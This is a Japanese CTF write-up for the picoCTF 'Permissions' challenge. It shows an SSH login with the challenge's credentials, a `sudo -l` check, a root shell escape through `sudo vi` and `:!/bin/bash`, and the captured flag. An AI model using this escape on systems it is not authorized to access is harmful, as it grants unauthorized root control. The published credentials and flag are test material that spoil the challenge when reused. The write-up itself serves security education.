# Permissions - Writeup

**著者:** Peter Muiruri
**投稿日:** 2023年3月30日

このCTFは、Linuxの権限昇格（Privilege Escalation）に関する知識をテストするものです。問題文に記載された認証情報を使用してSSHでサーバーに接続し、rootディレクトリ内のファイルを読むことが目的です。

---

## 手順

### 1. SSHで接続する

次のコマンドでサーバーに接続します。

```bash
ssh -p 60665 picoplayer@saturn.picoctf.net
# パスワード: vCR2tuwCRm
```

---

### 2. sudo権限を確認する

ユーザーがどのようなsudo権限を持っているか確認します。

```bash
sudo -l
```

出力結果から、ユーザーが `vi` テキストエディタをroot権限で実行できることが分かります。

---

### 3. viをroot権限で起動する

次のようにして任意のファイルをroot権限で開きます。

```bash
sudo vi test
```

現在のディレクトリに`test`という空ファイルを作成して開きます。

---

### 4. viのコマンドモードからbashを起動する

`Esc`キーを押してコマンドモードに入り、次のコマンドを入力します。

```vim
:!/bin/bash
```

これによりroot権限のbashシェルが起動します（`vi`がsudo経由でroot権限を持っているため）。

---

### 5. /rootディレクトリのファイルを確認

rootシェルを取得したら、`/root`ディレクトリに移動してフラグを探します。

```bash
cd /root
ls -la
```

最初に`ls`を実行しても何も表示されませんでしたが、`ls -la`を使うことで隠しファイルを含めた一覧が表示されます。目的のフラグファイルを見つけたら内容を確認します。

```bash
cat <flag_file>
```

---

### ✅ フラグ

```
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
```

---

## 解説

この問題は、`sudo`で`vi`をroot権限で実行できる状況を利用して権限昇格を行う典型的なCTF問題です。`vi`や`vim`のような対話型エディタは、内部でシェルコマンドを実行できるため、`sudo`権限が与えられているとroot権限のシェルを取得できます。

**参考:** [GTFOBins: vi](https://gtfobins.github.io/gtfobins/vi/)

---

## まとめ

* `sudo -l` で実行可能なコマンドを確認
* `vi` がroot権限で許可されている場合、`:!/bin/bash`でrootシェル取得
* `/root`ディレクトリ内のフラグを読む

この一連の手順で、Linuxの権限昇格の仕組みを理解し、セキュリティ設定の重要性を学ぶことができます。
